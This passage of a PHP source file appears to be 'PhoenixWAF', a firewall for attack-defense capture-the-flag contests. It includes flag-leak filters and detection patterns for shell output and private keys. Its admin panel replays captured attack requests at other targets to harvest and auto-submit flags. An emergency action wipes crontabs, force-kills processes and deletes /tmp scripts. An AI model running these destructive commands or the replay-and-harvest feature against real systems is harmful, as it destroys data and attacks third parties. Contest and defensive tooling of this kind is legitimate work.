        $mod = preg_replace_callback('/[0-9a-fA-F]{20,}/', function($m) use ($fp, $fake) {
            $h = $m[0];
            if (strlen($h) % 2 !== 0) return $m[0];
            $d = '';
            for ($i = 0; $i < strlen($h); $i += 2) $d .= chr(hexdec(substr($h, $i, 2)));
            if (preg_match($fp, $d)) {
                return bin2hex(pwaf_same_length_fake($d, $fake));
            }
            return $m[0];
        }, $out);
        if ($mod !== $out) {
            pwaf_log($cfg, $ip, 'flag_leak_hex', 'response', substr($out, 0, 200), 'replaced');
            $out = $mod; $modified = true;
        }
    }

        if (stripos($out, '%7') !== false) {
        $mod = preg_replace_callback('/[A-Za-z0-9%_\-\.!@#$\^&*()+=]{6,220}/', function($m) use ($fp, $fake) {
            $d = rawurldecode($m[0]);
            if ($d !== $m[0] && preg_match($fp, $d, $dm)) {
                $sf = pwaf_same_length_fake($dm[0], $fake);
                return str_ireplace(rawurlencode($dm[0]), rawurlencode($sf), $m[0]);
            }
            return $m[0];
        }, $out);
        if ($mod !== $out) {
            pwaf_log($cfg, $ip, 'flag_leak_url', 'response', substr($out, 0, 200), 'replaced');
            $out = $mod; $modified = true;
        }
    }

    // HTML-entity encoded flag (&#102;&#108;... 或 &#x66;...) — 只改写连续实体块，不动全页
    if (strpos($out, '&#') !== false) {
        $mod = preg_replace_callback('/(?:&#x?[0-9a-fA-F]+;){6,}/i', function($m) use ($fp, $fake) {
            $d = html_entity_decode($m[0], ENT_QUOTES | ENT_HTML5, 'UTF-8');
            if (preg_match($fp, $d, $dm)) {
                $sf = pwaf_same_length_fake($dm[0], $fake);
                $enc = '';
                for ($i = 0; $i < strlen($sf); $i++) $enc .= '&#' . ord($sf[$i]) . ';';
                return $enc;
            }
            return $m[0];
        }, $out);
        if ($mod !== $out) {
            pwaf_log($cfg, $ip, 'flag_leak_entity', 'response', substr($out, 0, 200), 'replaced');
            $out = $mod; $modified = true;
        }
    }

    // Reversed flag (}...{galf / }...{ftc) — 攻击者用 strrev 绕过响应检测。
    // 自定义格式无固定倒序标记，故 $custom 时也进入（$fp 兜底）。
    if ($custom || stripos($out, '{galf') !== false || stripos($out, '{ftc') !== false) {
        $rev = strrev($out);
        if (preg_match($fp, $rev, $rm)) {
            $rev = preg_replace($fp, pwaf_same_length_fake($rm[0], $fake), $rev);
            $out = strrev($rev);
            pwaf_log($cfg, $ip, 'flag_leak_reverse', 'response', substr($out, 0, 200), 'replaced');
            $modified = true;
        }
    }

        foreach (array('/root:x:0:0:/', '/uid=\\d+\\(\\w+\\)\\s+gid=\\d+/', '/Linux\\s+\\S+\\s+\\d+\\.\\d+\\.\\d+\\s+#\\d+/', '/-----BEGIN (?:RSA |OPENSSH |EC )?PRIVATE KEY-----/') as $sp) {
        if (@preg_match($sp, $out)) {
            pwaf_log($cfg, $ip, 'shell_output', 'response', substr($out, 0, 200), 'blocked');
            $out = '<!DOCTYPE html><html><body><p>OK</p></body></html>';
            break;
        }
    }

        if ($was_compressed) {
        if ($compress_encoding === 'gzip') {
            $out = gzencode($out, 6);
        } elseif ($compress_encoding === 'deflate') {
            $out = gzcompress($out, 6);
        }
    }
        if (!headers_sent()) {
        header('Content-Length: ' . strlen($out), true);
    }
    return $out;
}

// 扫描所有文件（PHP + 配置 + 脚本 + 数据库 + 可执行），检测新增/篡改（包含防刷屏去重）
function pwaf_integrity_check(array $cfg) {
    $db      = (isset($cfg['integrity_db']) ? $cfg['integrity_db'] : (pwaf_datadir($cfg) . '/.pwaf_int'));
    $webroot = (isset($cfg['webroot']) ? $cfg['webroot'] : '');
    if (!$webroot || !is_dir($webroot) || !file_exists($db)) return;

    $stored  = json_decode(@file_get_contents($db), true) ?: [];
    $base    = (isset($stored['b']) ? $stored['b'] : []);
    $alerted = (isset($stored['a']) ? $stored['a'] : []);     $lp      = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
    $db_changed = false;

    foreach (pwaf_all_files($webroot) as $file) {
        $h = hash_file('sha256', $file);
        
        if (!isset($base[$file])) {
            if (!isset($alerted[$file]) || $alerted[$file] !== $h) {
                $e = json_encode(['ts'=>time(),'dt'=>date('Y-m-d H:i:s'),'ip'=>'SYS','method'=>'INT','uri'=>$file,
                    'rule'=>'integrity_new','payload'=>$h,'param'=>'file','ua'=>'','action'=>'alert'],
                    JSON_UNESCAPED_UNICODE) . "\n";
                @file_put_contents($lp, $e, FILE_APPEND);
                $alerted[$file] = $h;
                $db_changed = true;
            }
        } elseif ($base[$file] !== $h) {
            if (!isset($alerted[$file]) || $alerted[$file] !== $h) {
                $e = json_encode(['ts'=>time(),'dt'=>date('Y-m-d H:i:s'),'ip'=>'SYS','method'=>'INT','uri'=>$file,
                    'rule'=>'integrity_modified','payload'=>$h,'param'=>'file','ua'=>'','action'=>'alert'],
                    JSON_UNESCAPED_UNICODE) . "\n";
                @file_put_contents($lp, $e, FILE_APPEND);
                $alerted[$file] = $h;
                $db_changed = true;
            }
        }
    }

    if ($db_changed) {
        $stored['a'] = $alerted;
        @file_put_contents($db, json_encode($stored), LOCK_EX);
    }
}


function pwaf_all_files($wr) {
        $watch_ext = ['php','php3','php4','php5','php7','phtml','phar',
                  'ini','conf','config','cfg','htaccess','htpasswd',
                  'sh','bash','py','pl','rb','cgi',
                  'sql','sqlite','db',
                  'jsp','jspx','asp','aspx','cfm',
                  'xml','json','yaml','yml',
                  'env','key','pem','crt'];
    $files = [];
    $skip_dirs = ['.git', 'node_modules', 'vendor', '.svn'];
    // Also skip the data directory (random hidden dir from .pwaf_ptr)
    $ptr = $wr . '/.pwaf_ptr';
    if (file_exists($ptr)) {
        $pdir = trim(file_get_contents($ptr));
        if ($pdir !== '') $skip_dirs[] = $pdir;
    }
    try {
        $iter = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($wr, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iter as $f) {
            if (!$f->isFile()) continue;
                        $base = $f->getFilename();
            if ($base[0] === '.' && strpos($base, '.pwaf') === 0) continue;
            if ($base === 'waf.php') continue;
                        $path = $f->getRealPath();
            $skip = false;
            foreach ($skip_dirs as $sd) {
                if (strpos($path, DIRECTORY_SEPARATOR . $sd . DIRECTORY_SEPARATOR) !== false) { $skip = true; break; }
            }
            if ($skip) continue;
                        if ($f->getSize() > 52428800) continue;
            $ext = strtolower($f->getExtension());
            if (in_array($ext, $watch_ext, true)) $files[] = $path;
        }
    } catch (Exception $ex) {}
    return $files;
}

// SECTION 6: ADMIN PANEL

function pwaf_panel(array &$cfg, $ip) {
    session_start();
    $key = (isset($GLOBALS['_PWAF_GET']['waf_key']) ? $GLOBALS['_PWAF_GET']['waf_key'] : (isset($GLOBALS['_PWAF_POST']['waf_key']) ? $GLOBALS['_PWAF_POST']['waf_key'] : ''));
    $self = $GLOBALS['_PWAF_SERVER']['PHP_SELF'] . '?waf_key=' . urlencode($key);
    $e = function($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); };

        if (empty($_SESSION['pwaf'])) {
        if ($GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] === 'POST' && isset($GLOBALS['_PWAF_POST']['pw'])) {
            if (!empty($cfg['hash']) && password_verify($GLOBALS['_PWAF_POST']['pw'], $cfg['hash'])) {
                $_SESSION['pwaf'] = $ip;
            } else {
                usleep(2000000);
                pwaf_login_page($e, $key, 'Wrong password.');
                return;
            }
        } else { pwaf_login_page($e, $key, ''); return; }
    }
    if ($_SESSION['pwaf'] !== $ip) { session_destroy(); pwaf_login_page($e, $key, 'Session expired.'); return; }

        if (isset($GLOBALS['_PWAF_GET']['_poll'])) {
        header('Content-Type: application/json');
        $poll_stats = pwaf_stats($cfg);
        $latest = (isset($poll_stats['recent'][0]) ? $poll_stats['recent'][0] : []);
        
                $recent_blocks = [];
        foreach (array_slice($poll_stats['recent'], 0, 30) as $ev) {
            if (((isset($ev['action']) ? $ev['action'] : '')) === 'block') {
                $recent_blocks[] = $ev;
            }
        }
        
        echo json_encode([
            'total'         => $poll_stats['total'],
            'blocked'       => $poll_stats['blocked'],
            'latest_rule'   => (isset($latest['rule']) ? $latest['rule'] : ''),
            'latest_ip'     => (isset($latest['ip']) ? $latest['ip'] : ''),
            'latest_uri'    => (isset($latest['uri']) ? $latest['uri'] : ''),
            'recent_blocks' => $recent_blocks
        ]);
        return;
    }
        if (isset($GLOBALS['_PWAF_GET']['_poll_full'])) {
        header('Content-Type: application/json');
        $lp = (isset($cfg['log']) ? $cfg['log'] : (pwaf_datadir($cfg) . '/.pwaf_log'));
        $al = preg_replace('/\.([^.]+)$/', '_access.$1', $lp);
        
        $merged = [];
                foreach ([$lp, $al] as $f) {
            foreach (pwaf_tail_lines($f, 50) as $line) {
                $ev = json_decode($line, true);
                if (!is_array($ev)) continue;
                $ev['_id']  = md5($line);   // 每条日志唯一 ID（前端流量展示去重）
                // 内容签名（方法+URI+POST）：盲打按此去重，避免同一 payload 因时间戳不同、
                                $ev['_sig'] = md5(((isset($ev['method']) ? $ev['method'] : '')) . '|'
                                . ((isset($ev['uri']) ? $ev['uri'] : '')) . '|'
                                . ((isset($ev['post']) ? $ev['post'] : '')));
                $merged[] = $ev;
            }
        }
                usort($merged, function($a, $b) {
            return ((isset($b['ts']) ? $b['ts'] : 0)) - ((isset($a['ts']) ? $a['ts'] : 0));
        });
        
        echo json_encode(array_slice($merged, 0, 50));
        return;
    }
        if (isset($GLOBALS['_PWAF_GET']['_replay']) && $GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] === 'POST') {
        header('Content-Type: application/json');
        $target_ip   = trim((isset($GLOBALS['_PWAF_POST']['target_ip']) ? $GLOBALS['_PWAF_POST']['target_ip'] : ''));
        $target_port = (int)((isset($GLOBALS['_PWAF_POST']['target_port']) ? $GLOBALS['_PWAF_POST']['target_port'] : 80));
        $raw_request = (isset($GLOBALS['_PWAF_POST']['raw_request']) ? $GLOBALS['_PWAF_POST']['raw_request'] : '');
        if (!$target_ip || !$raw_request) {
            echo json_encode(['error' => 'missing params']); return;
        }
                $raw_request = str_replace('{target}', $target_ip . ($target_port !== 80 ? ':' . $target_port : ''), $raw_request);
        $lines = explode("\n", str_replace("\r\n", "\n", $raw_request));
        $first = trim(array_shift($lines));
        if (!preg_match('/^(GET|POST|PUT|PATCH|DELETE)\s+(\S+)\s+HTTP/i', $first, $fm)) {
            echo json_encode(['error' => 'invalid request line']); return;
        }
        $rm = strtoupper($fm[1]); $rp = $fm[2];
        $hdrs = []; $body = ''; $body_start = false; $host_set = false;
        foreach ($lines as $line) {
            $line = rtrim($line);
            if ($body_start) { $body .= $line . "\n"; continue; }
            if ($line === '') { $body_start = true; continue; }
            if (stripos($line, 'content-length:') === 0) continue;   // 改写后重算，避免长度不符导致目标截断/挂起
            $hdrs[] = $line;
            if (stripos($line, 'Host:') === 0) $host_set = true;
        }
        if (!$host_set) array_unshift($hdrs, 'Host: ' . $target_ip . ($target_port !== 80 ? ':' . $target_port : ''));
        $body = rtrim($body);
        if ($body !== '') $hdrs[] = 'Content-Length: ' . strlen($body);
        $scheme = ($target_port === 443) ? 'https' : 'http';
        $url = $scheme . '://' . $target_ip . ($target_port !== 80 && $target_port !== 443 ? ':' . $target_port : '') . $rp;
        $ctx = stream_context_create(['http' => [
            'method'        => $rm,
            'header'        => implode("\r\n", $hdrs),
            'content'       => $body,
            'timeout'       => 3,
            'ignore_errors' => true,
        ]]);
        $resp = @file_get_contents($url, false, $ctx);
        // 多编码 flag 提取(明文/base64/hex/url/倒序 + flag|ctf)并自动提交
        $found_flags = ($resp !== false) ? pwaf_extract_flags($resp, $cfg) : [];
        foreach ($found_flags as $ff) pwaf_auto_submit_flag($ff, $cfg);
        echo json_encode([
            'ok'    => true,
            'body'  => substr((string)$resp, 0, 2000),
            'flags' => $found_flags,
            'error' => ($resp === false) ? 'connection failed' : '',
        ]);
        return;
    }

        if ($GLOBALS['_PWAF_SERVER']['REQUEST_METHOD'] === 'POST') {
        $act = (isset($GLOBALS['_PWAF_POST']['act']) ? $GLOBALS['_PWAF_POST']['act'] : '');
        switch ($act) {
            case 'toggle_waf':   $cfg['enabled'] = !$cfg['enabled']; pwaf_save_cfg($cfg); break;
            case 'toggle_autoban': $cfg['auto_ban'] = empty($cfg['auto_ban']); pwaf_save_cfg($cfg); break;
            case 'toggle_stealth': $cfg['stealth']  = empty($cfg['stealth']);  pwaf_save_cfg($cfg); break;
            case 'set_fpmode':
                $m = (isset($GLOBALS['_PWAF_POST']['fp_mode']) ? $GLOBALS['_PWAF_POST']['fp_mode'] : 'balanced');
                if (in_array($m, ['balanced','strict','paranoid'], true)) { $cfg['fp_mode'] = $m; pwaf_save_cfg($cfg); }
                break;
            case 'toggle_static':
                $cfg['static_bypass'] = empty($cfg['static_bypass']); pwaf_save_cfg($cfg); break;
            case 'save_openbasedir':
                $cfg['open_basedir'] = trim((isset($GLOBALS['_PWAF_POST']['open_basedir']) ? $GLOBALS['_PWAF_POST']['open_basedir'] : ''));
                pwaf_save_cfg($cfg);
                if ($cfg['open_basedir']) {
                    @ini_set('open_basedir', $cfg['open_basedir'] . PATH_SEPARATOR . '/tmp/' . PATH_SEPARATOR . sys_get_temp_dir());
                }
                break;
            case 'toggle_rule':
                $r = (isset($GLOBALS['_PWAF_POST']['rule']) ? $GLOBALS['_PWAF_POST']['rule'] : '');
                if (isset($cfg['rules'][$r])) { $cfg['rules'][$r] = !$cfg['rules'][$r]; pwaf_save_cfg($cfg); }
                break;
            case 'add_wl':
                $ni = trim((isset($GLOBALS['_PWAF_POST']['ip']) ? $GLOBALS['_PWAF_POST']['ip'] : ''));
                if (filter_var($ni, FILTER_VALIDATE_IP) && !in_array($ni, $cfg['whitelist'], true)) {
                    $cfg['whitelist'][] = $ni; pwaf_save_cfg($cfg);
                }
                break;
            case 'add_bl':
                $ni = trim((isset($GLOBALS['_PWAF_POST']['ip']) ? $GLOBALS['_PWAF_POST']['ip'] : ''));
                if (filter_var($ni, FILTER_VALIDATE_IP) && !in_array($ni, $cfg['blacklist'], true)) {
                    $cfg['blacklist'][] = $ni; pwaf_save_cfg($cfg);
                }
                break;
            case 'rm_ip':
                $ri = trim((isset($GLOBALS['_PWAF_POST']['ip']) ? $GLOBALS['_PWAF_POST']['ip'] : '')); $lst = (isset($GLOBALS['_PWAF_POST']['list']) ? $GLOBALS['_PWAF_POST']['list'] : '');
                if ($lst === 'wl') {
                    $x = $ri; $cfg['whitelist'] = array_values(array_filter($cfg['whitelist'], function($v) use ($x) { return $v !== $x; }));
                } elseif ($lst === 'bl') {
                    $x = $ri; $cfg['blacklist'] = array_values(array_filter($cfg['blacklist'], function($v) use ($x) { return $v !== $x; }));
                } elseif ($lst === 'ck') {
                    $x = $ri; $cfg['checker_ips'] = array_values(array_filter($cfg['checker_ips'], function($v) use ($x) { return $v !== $x; }));
                }
                pwaf_save_cfg($cfg);
                break;
            case 'fake_flag':
                $ff = trim((isset($GLOBALS['_PWAF_POST']['ff']) ? $GLOBALS['_PWAF_POST']['ff'] : ''));
                if ($ff) { $cfg['fake_flag'] = $ff; pwaf_save_cfg($cfg); }
                break;
            case 'clear_log': @file_put_contents($cfg['log'], ''); break;
            case 'export_csv': pwaf_export_csv($cfg); return;
            case 'update_baseline': pwaf_update_baseline($cfg); break;
            case 'logout': session_destroy(); header('Location: '.$self); exit;
                        case 'add_custom_rule':
                $rname = preg_replace('/[^a-z0-9_]/', '', strtolower(trim((isset($GLOBALS['_PWAF_POST']['rname']) ? $GLOBALS['_PWAF_POST']['rname'] : ''))));
                $rpat  = trim((isset($GLOBALS['_PWAF_POST']['rpat']) ? $GLOBALS['_PWAF_POST']['rpat'] : ''));
                $rscope= trim((isset($GLOBALS['_PWAF_POST']['rscope']) ? $GLOBALS['_PWAF_POST']['rscope'] : 'all'));
                if ($rname && $rpat && @preg_match($rpat, '') !== false) {
                    if (!isset($cfg['custom_rules'])) $cfg['custom_rules'] = [];
                    $cfg['custom_rules'][$rname] = ['pat' => $rpat, 'scope' => $rscope, 'enabled' => true];
                    pwaf_save_cfg($cfg);
                }
                break;
            case 'del_custom_rule':
                $rname = trim((isset($GLOBALS['_PWAF_POST']['rname']) ? $GLOBALS['_PWAF_POST']['rname'] : ''));
                if (isset($cfg['custom_rules'][$rname])) {
                    unset($cfg['custom_rules'][$rname]); pwaf_save_cfg($cfg);
                }
                break;
            case 'toggle_custom_rule':
                $rname = trim((isset($GLOBALS['_PWAF_POST']['rname']) ? $GLOBALS['_PWAF_POST']['rname'] : ''));
                if (isset($cfg['custom_rules'][$rname])) {
                    $cfg['custom_rules'][$rname]['enabled'] = !$cfg['custom_rules'][$rname]['enabled'];
                    pwaf_save_cfg($cfg);
                }
                break;
                        case 'save_forward':
                $cfg['forward_enabled'] = !empty($GLOBALS['_PWAF_POST']['forward_enabled']);
                                $raw_targets = trim((isset($GLOBALS['_PWAF_POST']['forward_targets_raw']) ? $GLOBALS['_PWAF_POST']['forward_targets_raw'] : ''));
                $targets = [];
                foreach (explode("\n", $raw_targets) as $line) {
                    $line = trim($line);
                    if (!$line || $line[0] === '#') continue;
                                        $parts = preg_split('/\s+/', $line, 3);
                    $hp = $parts[0];
                    $cidr = (isset($parts[1]) ? $parts[1] : '');
                    if (strpos($hp, ':') !== false) {
                        list($h, $p) = explode(':', $hp, 2);
                        if (strpos($p, '-') !== false) {
                                                        list($pstart, $pend) = explode('-', $p, 2);
                            $pstart = (int)$pstart;
                            $pend = (int)$pend;
                            // 限制单条端口范围最多 256 个，避免 host:1-65535 生成上万目标、
                                                        $added = 0;
                            for ($i = $pstart; $i <= $pend && $added < 256; $i++) {
                                if ($i > 0 && $i <= 65535) { $targets[] = ['host'=>$h, 'port'=>$i, 'cidr'=>$cidr, 'enabled'=>true]; $added++; }
                            }
                            continue;
                        }
                    } else { $h = $hp; $p = '80'; }
                    if (!$h) continue;
                    $targets[] = ['host'=>$h, 'port'=>(int)$p, 'cidr'=>$cidr, 'enabled'=>true];
                }
                $cfg['forward_targets'] = $targets;
                pwaf_save_cfg($cfg);
                break;

                        case 'save_autoreap':
                $cfg['autoreap_enabled'] = !empty($GLOBALS['_PWAF_POST']['autoreap_enabled']);
                $cfg['autoreap_ip_start'] = trim((isset($GLOBALS['_PWAF_POST']['autoreap_ip_start']) ? $GLOBALS['_PWAF_POST']['autoreap_ip_start'] : ''));
                $cfg['autoreap_ip_end'] = trim((isset($GLOBALS['_PWAF_POST']['autoreap_ip_end']) ? $GLOBALS['_PWAF_POST']['autoreap_ip_end'] : ''));
                $cfg['autoreap_port_start'] = trim((isset($GLOBALS['_PWAF_POST']['autoreap_port_start']) ? $GLOBALS['_PWAF_POST']['autoreap_port_start'] : '80'));
                $cfg['autoreap_port_end'] = trim((isset($GLOBALS['_PWAF_POST']['autoreap_port_end']) ? $GLOBALS['_PWAF_POST']['autoreap_port_end'] : '80'));
                pwaf_save_cfg($cfg);
                break;

                        case 'save_flagsub':
                $cfg['flagsub_enabled']  = !empty($GLOBALS['_PWAF_POST']['flagsub_enabled']);
                                // false，导致整条 flag 擦除链失效(自伤泄露)。仅当能编译通过才采纳，否则保留旧值/清空。
                $new_re = trim((isset($GLOBALS['_PWAF_POST']['flagsub_regex']) ? $GLOBALS['_PWAF_POST']['flagsub_regex'] : ''));
                if ($new_re === '') {
                    $cfg['flagsub_regex'] = '';
                } elseif (@preg_match('/' . str_replace('/', '\\/', $new_re) . '/', '') !== false) {
                    $cfg['flagsub_regex'] = $new_re;
                }   // 非法正则：不更新，沿用原值，避免擦除链被打断
                $cfg['flagsub_template'] = trim((isset($GLOBALS['_PWAF_POST']['flagsub_template']) ? $GLOBALS['_PWAF_POST']['flagsub_template'] : ''));
                pwaf_save_cfg($cfg);
                break;
                        case 'kill_processes':
                $kill_log = [];
                if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN') {
                                        @exec('crontab -r 2>/dev/null', $o); $kill_log[] = 'crontab cleared';
                    @exec('for f in /var/spool/cron/*; do echo > "$f" 2>/dev/null; done');
                    @exec('echo > /etc/crontab 2>/dev/null');
                                        $user = trim(@exec('whoami'));
                    if ($user) {
                        @exec("ps -u $user -o pid,comm --no-headers 2>/dev/null", $procs);
                        $safe = ['apache2','httpd','nginx','php-fpm','php','sshd','bash','sh'];
                        $killed = 0;
                        foreach ($procs as $proc) {
                            $proc = trim($proc);
                            if (!$proc) continue;
                            $parts = preg_split('/\s+/', $proc, 2);
                            $pid = (int)((isset($parts[0]) ? $parts[0] : 0));
                            $cmd = strtolower((isset($parts[1]) ? $parts[1] : ''));
                            if ($pid <= 1) continue;
                            $isSafe = false;
                            foreach ($safe as $s) { if (strpos($cmd, $s) !== false) { $isSafe = true; break; } }
                            if (!$isSafe && $pid !== getmypid()) {
                                @exec("kill -9 $pid 2>/dev/null");
                                $killed++;
                            }
                        }
                        $kill_log[] = "killed $killed suspicious processes";
                    }
                                        @exec('find /tmp -maxdepth 2 -name "*.php" -delete 2>/dev/null');
                    @exec('find /tmp -maxdepth 2 -name "*.sh" -delete 2>/dev/null');
                    $kill_log[] = 'cleaned /tmp scripts';
                } else {
                    $kill_log[] = 'process killer not available on Windows';
                }
                pwaf_log($cfg, $ip, 'emergency_cleanup', 'panel', implode('; ', $kill_log), 'action');
                break;
        }
        header('Location: ' . $self); exit;
    }

    $stats = pwaf_stats($cfg);
    $on    = $cfg['enabled'];
    ?>
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>PhoenixWAF</title><style>
*{box-sizing:border-box;margin:0;padding:0}
:root{--bg:#0a0e1a;--card:#0f1629;--border:#1e2d4a;--accent:#f97316;--cyan:#38bdf8;--red:#f87171;--green:#4ade80;--muted:#4a5568;--text:#c9d1e0;--text2:#7a8ba0}
body{background:var(--bg);color:var(--text);font-family:'Courier New',Consolas,monospace;font-size:14px;min-height:100vh;display:flex;flex-direction:column}
/* scrollbar */
::-webkit-scrollbar{width:6px;height:6px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:#1e2d4a;border-radius:3px}
/* layout */
.layout{display:flex;flex:1;overflow:hidden}
/* sidebar */
.sidebar{width:200px;min-width:200px;background:var(--card);border-right:1px solid var(--border);display:flex;flex-direction:column;padding:0}
.sidebar-logo{padding:20px 16px 14px;border-bottom:1px solid var(--border)}
.sidebar-logo .logo-text{color:var(--accent);font-size:16px;font-weight:bold;letter-spacing:3px;text-shadow:0 0 20px rgba(249,115,22,.4)}
.sidebar-logo .logo-ver{color:var(--text2);font-size:10px;margin-top:3px}
.nav-item{display:flex;align-items:center;gap:10px;padding:11px 16px;cursor:pointer;color:var(--text2);font-size:12px;letter-spacing:.5px;border-left:3px solid transparent;transition:all .2s;user-select:none}
.nav-item:hover{color:var(--text);background:rgba(249,115,22,.06);border-left-color:rgba(249,115,22,.3)}
.nav-item.active{color:var(--accent);background:rgba(249,115,22,.1);border-left-color:var(--accent)}
.nav-icon{font-size:14px;width:18px;text-align:center}
.sidebar-footer{margin-top:auto;padding:14px 16px;border-top:1px solid var(--border)}
/* topbar */
.topbar{background:var(--card);border-bottom:1px solid var(--border);padding:10px 24px;display:flex;align-items:center;gap:14px;flex-shrink:0}
.topbar-title{color:var(--accent);font-size:15px;font-weight:bold;letter-spacing:2px;text-shadow:0 0 16px rgba(249,115,22,.35)}
.topbar-spacer{flex:1}
.topbar-info{display:flex;align-items:center;gap:16px;color:var(--text2);font-size:11px}
.status-dot{width:8px;height:8px;border-radius:50%;display:inline-block;margin-right:5px;flex-shrink:0}
.status-dot.on{background:var(--green);box-shadow:0 0 8px var(--green);animation:pulse-green 2s infinite}
.status-dot.off{background:var(--red);box-shadow:0 0 8px var(--red);animation:pulse-red 2s infinite}
@keyframes pulse-green{0%,100%{box-shadow:0 0 4px var(--green)}50%{box-shadow:0 0 12px var(--green),0 0 20px rgba(74,222,128,.3)}}
@keyframes pulse-red{0%,100%{box-shadow:0 0 4px var(--red)}50%{box-shadow:0 0 12px var(--red),0 0 20px rgba(248,113,113,.3)}}
/* main content */
.main{flex:1;overflow-y:auto;padding:20px 24px}
/* tabs */
.tab-panel{display:none}.tab-panel.active{display:block;animation:tabfade .28s ease}
@keyframes tabfade{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
/* stat cards */
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:14px;margin-bottom:20px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:16px 18px;position:relative;overflow:hidden;transition:transform .2s,box-shadow .2s}
.stat-card:hover{transform:translateY(-2px)}
.stat-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;border-radius:8px 0 0 8px}
.stat-card.c-orange::before{background:var(--accent);box-shadow:0 0 12px rgba(249,115,22,.5)}
.stat-card.c-red::before{background:var(--red);box-shadow:0 0 12px rgba(248,113,113,.5)}
.stat-card.c-cyan::before{background:var(--cyan);box-shadow:0 0 12px rgba(56,189,248,.5)}
.stat-card.c-green::before{background:var(--green);box-shadow:0 0 12px rgba(74,222,128,.5)}
.stat-card.c-alert::before{background:var(--red)}
.stat-label{color:var(--text2);font-size:10px;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:8px}
.stat-val{font-size:28px;font-weight:bold;line-height:1}
.stat-val.orange{color:var(--accent);text-shadow:0 0 20px rgba(249,115,22,.3)}
.stat-val.red{color:var(--red);text-shadow:0 0 20px rgba(248,113,113,.3)}
.stat-val.cyan{color:var(--cyan);text-shadow:0 0 20px rgba(56,189,248,.3)}
/* section */
.sec{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:16px;margin-bottom:16px}
.sec-title{color:var(--accent);font-size:11px;text-transform:uppercase;letter-spacing:2px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:8px}
.sec-title::before{content:'';width:3px;height:12px;background:var(--accent);border-radius:2px;box-shadow:0 0 8px rgba(249,115,22,.5)}
/* controls bar */
.ctrl-bar{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
/* buttons */
.btn{display:inline-flex;align-items:center;gap:5px;padding:6px 12px;border-radius:5px;border:none;cursor:pointer;font-size:11px;font-family:inherit;font-weight:bold;letter-spacing:.5px;transition:all .2s;white-space:nowrap}
.btn:hover{filter:brightness(1.15);transform:translateY(-1px)}
.btn:active{transform:translateY(0)}
/* 键盘可达性：为按钮/输入/下拉/导航提供清晰的焦点环 */
.btn:focus-visible,input:focus-visible,select:focus-visible,textarea:focus-visible,.nav-item:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
.nav-item:focus-visible{outline-offset:-2px}
.bo{background:var(--accent);color:#000}.br{background:#dc2626;color:#fff}.bg{background:#16a34a;color:#fff}.bs{background:#1e2d4a;color:var(--text);border:1px solid var(--border)}
/* inputs */
input[type=text],input[type=password]{background:#060a14;border:1px solid var(--border);color:var(--text);padding:6px 10px;border-radius:5px;font-family:inherit;font-size:12px;transition:border-color .2s,box-shadow .2s;outline:none}
input[type=text]:focus,input[type=password]:focus{border-color:var(--accent);box-shadow:0 0 0 2px rgba(249,115,22,.15)}
/* rule badges */
.b{display:inline-block;padding:2px 7px;border-radius:4px;font-size:10px;font-weight:bold;background:#1e2d4a;color:#fff;letter-spacing:.3px}
.b-sqli{background:#5b21b6}.b-cmdi{background:#991b1b}.b-lfi{background:#92400e}.b-xss{background:#0e7490}
.b-code{background:#9d174d}.b-ssrf{background:#064e3b}.b-xxe{background:#1e3a8a}.b-unserialize{background:#78350f}
.b-upload{background:#7f1d1d}.b-flag_leak,.b-flag_leak_b64,.b-flag_leak_hex{background:#d97706;color:#000}
.b-honeypot{background:#065f46;color:#6ee7b7}.b-blacklist,.b-rate_limit{background:#374151}
.b-shell_output{background:#b91c1c}.b-checker_whitelist{background:#14532d;color:#86efac}
.b-integrity_new,.b-integrity_modified{background:#991b1b}
/* toggle switch */
.toggle-wrap{display:flex;justify-content:space-between;align-items:center;padding:7px 0;border-bottom:1px solid var(--border)}
.toggle-wrap:last-child{border-bottom:none}
.toggle-switch{position:relative;display:inline-block;width:40px;height:22px;flex-shrink:0;vertical-align:middle}
.toggle-switch input{opacity:0;width:0;height:0;position:absolute}
.toggle-slider{position:absolute;inset:0;background:#1e2d4a;border-radius:22px;cursor:pointer;transition:background .25s,box-shadow .25s;border:1px solid var(--border)}
.toggle-slider::after{content:'';position:absolute;width:16px;height:16px;left:2px;top:2px;background:#4a5568;border-radius:50%;transition:transform .25s,background .25s}
.toggle-switch input:checked + .toggle-slider{background:rgba(74,222,128,.15);border-color:#16a34a;box-shadow:0 0 8px rgba(74,222,128,.2)}
.toggle-switch input:checked + .toggle-slider::after{transform:translateX(18px);background:var(--green)}
/* rule row layout */
.rule-row{border-bottom:1px solid var(--border);padding:10px 0}
.rule-row:last-child{border-bottom:none}
.rule-header{display:flex;align-items:center;gap:0}
.rule-info{display:flex;align-items:center;gap:10px;flex:1;min-width:0;overflow:hidden}
.rule-toggle-form{flex-shrink:0;margin-left:auto;padding-left:16px;display:flex;align-items:center;height:22px}
/* IP tags */
.iptag{display:inline-flex;align-items:center;gap:4px;background:#0d1526;border:1px solid var(--border);padding:3px 8px;border-radius:4px;margin:2px;font-size:11px;transition:border-color .2s}
.iptag:hover{border-color:var(--accent)}
.iptag button{background:none;border:none;color:#f87171;cursor:pointer;font-size:13px;line-height:1;padding:0;transition:color .2s}
.iptag button:hover{color:#fff}
/* table */
table{width:100%;border-collapse:collapse}
th{text-align:left;color:var(--text2);font-size:11px;text-transform:uppercase;letter-spacing:1px;padding:6px 8px;border-bottom:1px solid var(--border)}
